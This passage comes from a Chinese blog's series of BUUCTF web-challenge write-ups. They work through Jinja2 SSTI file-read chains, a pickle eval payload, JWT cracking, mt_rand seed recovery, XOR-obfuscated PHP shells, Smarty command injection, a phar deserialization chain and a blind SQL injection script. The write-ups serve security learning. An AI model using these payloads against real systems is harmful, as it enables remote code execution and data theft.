flash(&quot;no no no !!&quot;) return redirect(url_for('decode')) res = render_template_string(tmp) flash( res ) return redirect(url_for('decode')) else : text = &quot;&quot; form = NameForm1(text) return render_template(&quot;index.html&quot;,form = form, method = &quot;解密&quot; , img = &quot;flask1.png&quot;) @app.route('/&lt;name&gt;',methods=['GET']) def not_found(name): return render_template(&quot;404.html&quot;,name = name) if __name__ == '__main__': app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True) 知道过滤了哪些字符了 接下来继续读取‘ 1{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}//这里也就不一定是需要catch_warnings了 也可以是下面的那个import很多很多 1{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt').read()}}{% endif %}{% endfor %} 尝试使用 1{{}} 构造语句： 1{{&quot;&quot;.__class__.__mro__[-1].__subclasses__()[75].__init__.__globals__['__builtins__'].}}//在75找到_frozen_importlib._ModuleLock可以指向builtins，而builtins里面有import可以使用，并且也有file那些东西，这个75是一个一个尝试出来的 作罢，只能一个个尝试了 接下来继续构造语句 1{{&quot;&quot;.__class__.__mro__[-1].__subclasses__()[75].__init__.__globals__['__builtins__'].open('app.py', 'r').read()}} r然后后面的语句就和之前的没啥区别了，这题还是学到了很多东西，总觉得自己ssti注入学的不够深入，很奇怪，大概是python还没真正学好吧 这边有个点：如果只是subclasses()的时候是出不了类的，但是builtins的时候是可以出他名下的函数，顺带出subclasses()的class 小结1.在python—ssti注入一文中添加了各个class可以使用的函数或者方法，以后就不会找的很迷茫了2.一般情况下都是subclasses爆出所有类，然后一个个去尝试数字靠近使用，这题主要靠盲猜了，不然就是用一个for循环进行遍历，我觉得这题考察的本意也是如此想要让我们使用for循环进行遍历吧。3.对于ssti注入 只能说继续学习吧！ [CISCN2019 华北赛区 Day1 Web2]ikunikun们冲鸭,一定要买到lv6!!! 可能是要买iv6？但是不知道咋买脚本如下: 1234567891011121314import requestsr=requests.session()url=&quot;http://23d9591f-d9fe-4282-a6e2-c7aab436b5bb.node3.buuoj.cn/shop?page=&quot;def searchlv6(): for i in range(1000): a=requests.get(url+str(i)) print(url+str(i)) if &quot;lv6.png&quot; in a.text: breakif __name__==&quot;__main__&quot;: searchlv6() 这里解释下：题目说要买到lv6，当我再找的时候页码会一直往下翻， 这些图片位置出现了lv2 5 但是就是没有lv6 于是猜想 可能某一页当中有lv6 python写个脚本 跑一下 发现在181页的位置出现了: 接下来购买看看 注册账号，登录购买，发现不够钱，抓包看看，发现可以改折扣：进入页面 说需要admin，抓包看看：这里有个jew很可疑，查一下： jwt伪造首先了解下JWT： JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。JWT常被用于前后端分离，可以和Restful API配合使用，常用于构建身份认证机制。 JWT的数据格式分为三个部分： headers , payloads，signature(签名)，它们使用.点号分割 验证方法：首先服务端会产生一个key，然后以这个key作为密钥，使用第一部分选择的加密方式（这里就是HS256），对第一部分和第二部分拼接的结果进行加密，然后把加密结果放到第三部分。 1服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。 因为加密算法我们已经知道了，如果我们只要再得到加密的key，我们就能伪造数据，并且通过服务器的检查。 所以此时我们爆破出我们的加密密钥 使用JWT cracker 果然直接在windows下载拖过去是最快的==，然后docker安装一下 直接 1234apt-get install libssl-devdocker build . -t jwtcrackdocker run -it --rm jwtcrackeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo 爆破出来了 密钥是1Kun 这样就可以进去了 然后审计源码 看了一下 这题是python反序列化，没遇过，于是跟着wp学习了1.python反序列语句: 1p = pickle.loads(urllib.unquote(become)) 所以become是我们传入的参数 找到become传入入口，开始操作： 12345678910import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (&quot;open('/flag.txt','r').read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print(a) 没遇见过 所以直接跟着打了一下，几个地方理解下 pickle反序列化 pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。 pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，pickle序列化后的数据，可读性差，人一般无法识别。 p = pickle.loads(urllib.unquote(become)) urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回我看了师傅们的博客之后的理解就是，我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用的函数为： （1）pickle.dump(obj, file, [,protocol]) 1234567 函数的功能：将obj对象序列化存入已经打开的file中。 参数讲解：obj：想要序列化的obj对象。file:文件名称。protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。 （2）pickle.load(file) 12345 函数的功能：将file中的对象序列化读出。 参数讲解：file：文件名称。 （3）pickle.dumps(obj[, protocol]) 123456 函数的功能：将obj对象序列化为string形式，而不是存入文件中。 参数讲解：obj：想要序列化的obj对象。protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。 （4）pickle.loads(string) 1234567 函数的功能：从string中读出序列化前的obj对象。 参数讲解：string：文件名称。 【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码 检测反序列化方法： 1全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。 防御方法 1231、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法；2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。 0\\|1**0x04解题** 本题中我们使用 **reduce **方法 我的理解是pickle反序列化过程中如果有reduce，那么在重建对象的时候就会调用，并且会调用我们使用的函数。paylaod: 1c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.","link":"/2021/04/18/buuctf12/"},{"title":"buuctf14","text":"[BSidesCF 2019]Futurella查看源码就有flag？ [GWCTF 2019]枯燥的抽奖1ULiwClayf&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION['seed'])){$_SESSION['seed']=rand(0,999999999);}mt_srand($_SESSION['seed']);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }$str_show = substr($str, 0, 10);echo &quot;&lt;p id='p1'&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST['num'])){ if($_POST['num']===$str){x echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&quot;; } else{ echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;; }}show_source(&quot;check.php&quot;); 第一反应是写脚本爆破，但是感觉数字太大了，再看看其他地方也没其他线索主要是， for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } 总觉得这个加密函数有点搞头吧？看看有无漏洞 mt_rand漏洞。。还真有==https://xz.aliyun.com/t/31https://www.anquanke.com/post/id/196831https://www.freebuf.com/sectool/205240.htmlhttps://github.com/openwall/php_mt_seed脚本下载链接 思路：1.由于我们得到的内容是经过处理的，所以我们要先还原才知道mt_rand生成了啥2.知道mt_rand生成了啥以后获得其随机种子3.获得随机种子在进行加密获得剩下的位数 str1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'str2='1ULiwClayf'str3 = str1[::-1]length = len(str2)res=''for i in range(0,9): for j in range(0,62): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+'61'+' '//这个是使用php_mt_seed脚本爆破所需要的格式 print(&quot;*&quot;*6) print(str2[i],str1[j]) breakprint(res) 27 27 0 61 56 56 0 61 47 47 0 61 8 8 0 61 22 22 0 61 38 38 0 61 11 11 0 61 0 0 0 61 24 24 0 61 脚本使用代码: 在目录下创建 make然后使用time ./php_mt_seed 随机数 复制网页生成随机字符串代码，更改我们的种子然后输出 &lt;?phpmt_srand('408372545');$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }print($str); 即可拿到flag [MRCTF2020]套娃查看源码 //1st$query = $_SERVER['QUERY_STRING']; if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){ die('Y0u are So cutE!');} if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t'])){ echo &quot;you are going to the next ~&quot;;}!--&gt; 解析一下 得到以下几点信息:1.传入数据不能有_且不能有%5f2.需要传入b_u_p_t且值为不等于2333又需要买满足正则匹配式以23333结尾so如何绕过？ php的字符串解析特性1.寻找_的替代品 https://www.freebuf.com/articles/web/213359.html 这篇文章里有：可以是用以上字符: 2.绕过正则匹配，也是以上文章 说%0a会被转化为空，也可以绕过正则匹配，于是: ?b+u+p+t=23333%0a 得到新提示 查看源码 看到jsfuck源码，f12控制台运行一下，说要post 拿到源码 &lt;?php error_reporting(0); include 'takeip.php';ini_set('open_basedir','.'); include 'flag.php';if(isset($_POST['Merak'])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; }echo 'Local access only!'.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!='127.0.0.1')echo &quot;Sorry,you don't have permission! Your ip is :&quot;.$ip;if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' ){echo &quot;Your REQUEST is:&quot;.change($_GET['file']);echo file_get_contents(change($_GET['file'])); }?&gt; 看到说还是需要ip进行绕过:ip读取有三种，一种是xff，一种client-ip还有一种是remote_addr这里我就用了client-ip就绕过了 client-ip: 127.0.0.1 使用PHP伪协议绕过字符串等于: ?2333=php://inputpost:todat is a happy day 接下来审计一下file的源码，如何加密: &lt;?phpfunction change($v){ $re = ''; for($i=0;$i&lt;strlen($v);$i++){ $re .= chr (ord($v[$i])-$i*2); } $re = base64_encode($re); return $re;}$a='flag.php';$flag=change($a);print($flag);//function change($v){// $v = base64_decode($v);// $re = '';// for($i=0;$i&lt;strlen($v);$i++){// $re .= chr ( ord ($v[$i]) + $i*2 );// }// return $re;//}//$a='ZmpdYSZmXGI=';//$flag=change($a);//print($flag);//$a='1';//print(chr(ord($a))); ZmpdYSZmXGI= 最终payload: ?2333=php://input&amp;file=ZmpdYSZmXGI= [极客大挑战 2019]RCE ME&lt;?phperror_reporting(0);if(isset($_GET['code'])){ $code=$_GET['code']; if(strlen($code)&gt;40){ die(&quot;This is too Long.&quot;); } if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){ die(&quot;NO.&quot;); } @eval($code);}else{ highlight_file(__FILE__);}// ?&gt; 本题给了源码，主要在于绕过正则匹配，如何构造？除了这些我们只剩下字符，所以如何用字符构造出字母呢？查到资料说是利用异或操作，写个python脚本跑一下看看都有啥字符: import restr = r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]{}\\/&quot;# if re.match('[a-zA-Z0-9]+','a'):result=&quot;&quot;print(chr(ord('!')^ord('@')))for j in range(len(str)): for i in range(len(str)): result=chr(ord(str[j])^ord(str[i])) # print(result) if re.match('[a-zA-Z0-9]+',result): print str[j]+&quot;^&quot;+str[i]+&quot;=&quot;+result print(&quot;\\n&quot;) 正则 re.findall 的简单用法（返回string中所有与pattern相匹配的全部字串，返回形式为数组）re.match(pattern，string)，要匹配的内容，以及要从什么里面匹配re.search，从什么里面搜索返回 构造一下payload: `$GET['1']`;&lt;^{=G&gt;^{=E{^/=T\\^;=g$_='&lt;&gt;{'^'{{/';//get\\^,=p@^)=i(^@=h.^@=n;^]=f/^@=o/^\\=s/^[=t~^!=_}^-=P/^`=O~^-=S'\\(\\@.;/'^',@,)@]@'$_='\\(\\@.;/'^',@,)@]@';$_();//phpinfo() 调试过程:使用pyhon脚本跑出字母以后，直接去取然后拼凑，异或操作可以合并进行异或，省事很多，打算要执行系统吗命令来着，但是啥也不执行不出来，去phpinfo里面查了一下发现是发现是disable_function禁用了很多函数，所以这里可以写shell进行disable_function插件的执行 &lt;?php// $code=$_GET['code'];// if(strlen($code)&gt;40){// die(&quot;This is too Long.&quot;);// }// if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){// die(&quot;NO.&quot;);// } //print('~&lt;&gt;{'^'!{{/');//$_='~&lt;&gt;{'^'!{{/';//get$_='~}/~{'^'!-`-/';//print($_); eval($$_['a']);//eval($_()); //print($_GET['a']); payload: http://90a70cb7-75d4-4059-b574-c59fe13eb0a2.node3.buuoj.cn/?code=$_='~&lt;&gt;{'^'!{{/';${$_}[_](${$_}[__]);&amp;_=assert&amp;__=eval($_POST['a'])//连续GET两个值，然后使用assert，这里用不了eval不知道为啥00，可能哪里不太符合php的格式，而assert对输入语句的格式要求没那么严格。 还有其他方法，https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/剩下的后面再好好看吧~有一说一，构造得我人都傻了–PS：调试eval的时候可以使用print先输出内容，或者使用phpinfo()执行，这样就可以得知eval到底能不能此语句！","link":"/2021/04/24/buuctf14/"},{"title":"buuctf13","text":"[CISCN2019 华东南赛区]Web11smarty模板注入 更改x-forwarded-for会有不同回显，猜测注入点在这，进行注入，百度了一下smarty模板，说是可以识别php语法：尝试payload: 1{system('ls')} 1{system('cat /flag')} 没啥问题 值得注意的是：之前整理过的关于smarty模板注入的语句用不了因为，，那个版本比较落后 1{self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)} 就是这个,原因：3.1.30的Smarty版本中官方已经把该静态方法删除 其他解题语句: 12345678910{if}标签官方文档中看到这样的描述：Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &amp;&amp;, and, is_array(), 等等，如：{if is_array($array)}{/if}*既然全部的PHP函数都可以使用，那么我们是否可以利用此来执行我们的代码呢？将XFF头改为{if phpinfo()}{/if}，可以看到题目执行了phpinfo()原文链接：https://blog.csdn.net/qq_45521281/article/details/107556915 [CISCN2019 华北赛区 Day1 Web1]Dropbox题目提示phar，记得是反序列化的内容：看看有无源码：没找到，上传一下文件，发现可以下载，尝试看看能不能修改下载位置，——存在任意文件下载漏洞，下载得到源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpsession_start();if (!isset($_SESSION['login'])) { header(&quot;Location: login.php&quot;); die();}?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;&lt;title&gt;网盘管理&lt;/title&gt;&lt;head&gt; &lt;link href=&quot;static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;link href=&quot;static/css/panel.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/js/toast.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/js/panel.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;nav aria-label=&quot;breadcrumb&quot;&gt; &lt;ol class=&quot;breadcrumb&quot;&gt; &lt;li class=&quot;breadcrumb-item active&quot;&gt;管理面板&lt;/li&gt; &lt;li class=&quot;breadcrumb-item active&quot;&gt;&lt;label for=&quot;fileInput&quot; class=&quot;fileLabel&quot;&gt;上传文件&lt;/label&gt;&lt;/li&gt; &lt;li class=&quot;active ml-auto&quot;&gt;&lt;a href=&quot;#&quot;&gt;你好 &lt;?php echo $_SESSION['username']?&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ol&gt;&lt;/nav&gt;&lt;input type=&quot;file&quot; id=&quot;fileInput&quot; class=&quot;hidden&quot;&gt;&lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt;&lt;?phpinclude &quot;class.php&quot;;$a = new FileList($_SESSION['sandbox']);$a-&gt;Name();$a-&gt;Size();?&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User { public $db; public function __construct() { global $db; $this-&gt;db = $db; } public function user_exist($username) { $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-&gt;db-&gt;close(); }}class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); } } public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = '&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;'; $table .= '&lt;thead&gt;&lt;tr&gt;'; foreach ($this-&gt;funcs as $func) { $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;' . htmlentities($func) . '&lt;/th&gt;'; } $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;'; $table .= '&lt;/thead&gt;&lt;tbody&gt;'; foreach ($this-&gt;results as $filename =&gt; $result) { $table .= '&lt;tr&gt;'; foreach ($result as $func =&gt; $value) { $table .= '&lt;td class=&quot;text-center&quot;&gt;' . htmlentities($value) . '&lt;/td&gt;'; } $table .= '&lt;td class=&quot;text-center&quot; filename=&quot;' . htmlentities($filename) . '&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;'; $table .= '&lt;/tr&gt;'; } echo $table; }}class File { public $filename; public function open($filename) { $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-&gt;filename); } public function size() { $size = filesize($this-&gt;filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-&gt;filename); } public function close() { return file_get_contents($this-&gt;filename); }}?&gt; 还有一个class.php，downloa.php也逃不了审计审计~ 看了一圈没看到反序列化的函数，回去仔细看了看phar反序列化 phar反序列化原理phar://也是流包装的一种 a stub可以理解为一个标志，格式为xxx&lt;?php xxx;__HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。 phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。 demo根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作 注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。 phar.php: 12345678910111213&lt;?php class TestObject { } $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new TestObject(); $o -&gt; data='hu3sky'; $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 访问后,会生成一个phar.phar在当前目录下。用winhex打开可以明显的看到meta-data是以序列化的形式存储的。有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下： phar_fan.php 123456789&lt;?phpclass TestObject{ function __destruct() { echo $this -&gt; data; // TODO: Implement __destruct() method. }}include('phar://phar.phar');?&gt; 输出hu3sky 利用点前面说道，php识别phar文件是通过其文件头的stub，就是那段代码，对其他是没有要求的，也就意味着，我们可以将phar文件伪装成其他格式的文件！ 12345678910111213&lt;?php class TestObject { } $phar = new Phar('phar.phar'); $phar -&gt; startBuffering(); $phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER();?&gt;'); //设置stub，增加gif文件头 $phar -&gt;addFromString('test.txt','test'); //添加要压缩的文件 $object = new TestObject(); $object -&gt; data = 'hu3sky'; $phar -&gt; setMetadata($object); //将自定义meta-data存入manifest $phar -&gt; stopBuffering();?&gt; 构造代码1234567891011121314151617eval.php&lt;?phpclass AnyClass{ var $output = 'echo &quot;ok&quot;;'; function __destruct() { eval($this -&gt; output); }}$phar = new Phar('phar.phar');$phar -&gt; stopBuffering();$phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER();?&gt;');$phar -&gt; addFromString('test.txt','test');$object = new AnyClass();$object -&gt; output= 'phpinfo();';$phar -&gt; setMetadata($object);$phar -&gt; stopBuffering(); 理解一下：phar的实现过程应该为，我们创建一个phar文件，对于这个类的meta—data是以序列化的形式存储的 当你读取他是则会进行反序列化输出: 补充几点：1.phar是一个压缩文件，里面存放着我们要压缩的文件以及一些存储的属性头信息（以序列化的形式存在）之类，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化 利用条件1.phar文件要能够上传到服务器端。2.如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数要有可用的魔术方法作为”跳板”。3.文件操作函数的参数可控，且::、/、phar等特殊字符没有被过滤。问题：这个有可用的魔术方法做跳板是为啥？指的是使用文件操作函数的魔术方法跳板吗？——是的 实战总觉得还是有哪里懵懵的有可用的魔术方法做跳板按照我的理解是，我们的读取phar反序列化出来的内容审计下代码，构造一下pop： 1234 public function close() { return file_get_contents($this-&gt;filename); }}//file 类中存在 file_get_contents方法，可以用来读取文件，如何到这里来 123public function __destruct() { $this-&gt;db-&gt;close();}//思路瞬间清晰了不少，将db赋值为file，怎么跳？ 123456public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } }//利用call魔术方法：__call 调用不可访问或不存在的方法时被调用 pop链如下：db(file)-&gt;close()=&gt;__call($file(file)-&gt;close())=&gt;file_get_contents=&gt;FileList里面的destruct输出回到页面上(当然，这里是我们要构造入文件内令其反序列化的内容) 1.构造phar文件： 123456789101112131415161718192021222324&lt;?phpclass User{ public $db;}class FileList{ private $files; public function __construct() { $this-&gt;files = array(new File()); }}class File{ public $filename='/flag.txt';}$user = new User();$user-&gt;db=new FileList();$phar = new Phar('phar.phar');$phar -&gt; stopBuffering();$phar -&gt; addFromString('test.txt','test');$phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER();?&gt;');$phar -&gt; setMetadata($user);$phar -&gt; stopBuffering(); 不知道为啥下午尝试的时候就是没法出flag，因此还去和wp对比了一下 发现也没啥不同的呀？然后补充一个download.php中的ini_setini_set(“open_basedir”, getcwd() . “:/etc:/tmp”);这个函数执行后，我们通过Web只能访问当前目录、/etc和/tmp三个目录，所以只能在delete.php中利用payload，而不是download.php。 补充第二个点，一直不是很清楚在哪里解析了phar://于是在本地跑了一下原来是在这，然后接下来尽管返回的false，但是phar已经被解析了，接下来就会继续执行反序列化操作，进入我们构造的链了 小结首先是思路小结：其实是因为一开始题目提示phar，所以自然而然就联想到要去找源码，看看序列化的点，所以此时就不会想到在登录框sql注入浪费时间，接下来尝试了各种功能，抓包，发现下载文件是可控的，所以接下来下载源码来审计，构造反序列语句就可以了 phar学习小结1.phar是一个压缩文件，我们构造的内容会以文件属性的形式序列化后存在于文件头中2.phar在被使用过程中会进行反序列化操作，例如，读取文件，查询文件是否存在，总之就是上面那几个文件函数，所以这个思路就是如何让我们的文件被读取？3.我们传入的删除文件的操作","link":"/2021/04/23/buuctf13/"},{"title":"buuctf15","text":"[WUSTCTF2020]颜值成绩查询这题sql注入，过滤了空格测试语句 1/**/and/**/1=11/**/and/**/1=2 盲注：需要写脚本=：构造payload： 1/**/and/**/substr(database(),1,1)='1'-- 学习一下使用二分法进行爆破 import requestsurl=&quot;http://b2b3ad31-796e-489d-8ad3-3dc8c3fc8257.node3.buuoj.cn/?stunum=&quot;s=requests.session()database=&quot;&quot;for i in range(1,10000): low =32 high=128 mid=(low+high)//2 while(low&lt;high): #payload_1=f&quot;1/**/and/**/ascii(substr(database(),{i},1))&gt;{mid}&quot; #payload_2=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='ctf'),{i},1))&gt;{mid}&quot; #payload_3=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),{i},1))&gt;{mid}&quot; payload_4= f&quot;1/**/and/**/ascii(substr((select/**/value/**/from/**/flag),{i},1))&gt;{mid}&quot; if &quot;Hi admin&quot; in s.get(url+payload_4).text: low = mid+1 else: high=mid mid=(low+high)//2 if(mid==32 or mid==132): break database +=chr(mid) print(database)print(database) 二分法快了不是一倍两倍– 真的超级快== [BSidesCF 2019]Kookie让我们以admin的方式登录，并且提示cookie，所以我就在cookie里添加，username=admin，就可以拿到flag了 [FBCTF2019]RCEService输入json类型数据:https://www.cnblogs.com/skysoot/archive/2012/04/17/2453010.html 测试 {&quot;cmd&quot;:&quot;ls&quot;}//有回显 然后想cat却不行，应该是有过滤==，然后去看了一下wp，说是比赛的时候有源码: &lt;?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) { $json = $_REQUEST['cmd']; if (!is_string($json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } else { echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) { system($cmd); } else { echo 'Invalid input'; } echo '&lt;br/&gt;&lt;br/&gt;'; }}?&gt; 确实是过滤了很多内容 